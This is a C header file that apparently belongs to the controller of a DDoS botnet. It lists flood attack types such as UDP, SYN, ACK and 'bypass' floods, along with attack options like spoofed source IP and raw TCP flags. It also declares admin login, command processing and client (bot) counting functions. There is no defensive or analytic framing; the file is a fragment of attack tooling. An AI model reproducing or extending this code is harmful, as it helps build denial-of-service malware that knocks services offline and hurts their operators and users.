#pragma once

#include <fcntl.h>
#include <string>

#include "main.h"

enum
{
    FLOOD_UDPFLOOD = 1,
    FLOOD_ACKPLAIN = 2,
    FLOOD_SYNPLAIN = 3,
    FLOOD_UDPPLAIN = 4,
    FLOOD_SYNACK = 5,
    FLOOD_SYNFLOOD = 6,
    FLOOD_ACKFLOOD = 7,
    FLOOD_ACKPSH = 8,
    FLOOD_BYPASS = 9,
    FLOOD_TCPSOCKET = 99,
    OPT_PORT = 1,
    OPT_SIZE = 2,
    OPT_HTTP_PATH = 4,
    OPT_HTTP_CONNECTION = 5,
    OPT_DOMAIN = 6,
    OPT_TCP_TTL = 7,
	OPT_TCP_SOURCE_PORT = 8,
	OPT_TCP_ACK = 9,
   	OPT_TCP_FIN = 10,
	OPT_TCP_URG = 11,
   	OPT_TCP_PSH = 12,
  	OPT_TCP_RST = 13,
	OPT_TCP_SYN = 14,
	OPT_TCP_TOS = 15,
  	OPT_TCP_ID = 16,
  	OPT_TCP_SEQUENCE = 17,
  	OPT_TCP_SOURCE_IP = 18,
  	OPT_TCP_ACK_SEQUENCE = 19
};

static int enable = 1;

#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define REUSE_ADDR(fd) (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)))
#define PACKED __attribute__((packed))

int admin_login(struct admin *);
struct command *command_process(struct process *);
int client_count(int);
